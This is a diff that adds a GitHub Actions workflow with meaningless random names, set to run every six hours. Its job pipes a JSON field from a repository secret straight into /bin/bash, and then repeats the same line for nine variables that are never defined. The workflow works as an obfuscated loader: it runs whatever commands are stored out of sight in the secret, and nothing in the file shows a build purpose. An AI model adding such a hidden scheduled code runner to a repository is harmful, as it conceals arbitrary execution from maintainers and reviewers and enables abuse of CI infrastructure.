@@ -1,0 +1,27 @@
+name: vikingcotton
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: vikingcotton
+        env:
+          ixx65060: ${{ secrets.ixx65060 }}
+        run: |
+          echo $ixx65060 | jq -r .hkn93 | /bin/bash
+          echo $nt381 | jq -r .cmmlc5 | /bin/bash
+          echo $aypgm59514 | jq -r .uv0 | /bin/bash
+          echo $fkaf0 | jq -r .hq7493 | /bin/bash
+          echo $uwoy6534 | jq -r .owo27 | /bin/bash
+          echo $bemm746 | jq -r .jsdm2643 | /bin/bash
+          echo $smi540 | jq -r .q7408 | /bin/bash
+          echo $efcc119 | jq -r .gvif4 | /bin/bash
+          echo $dc852 | jq -r .vgzxy8 | /bin/bash
+          echo $ft942 | jq -r .qk593 | /bin/bash
+
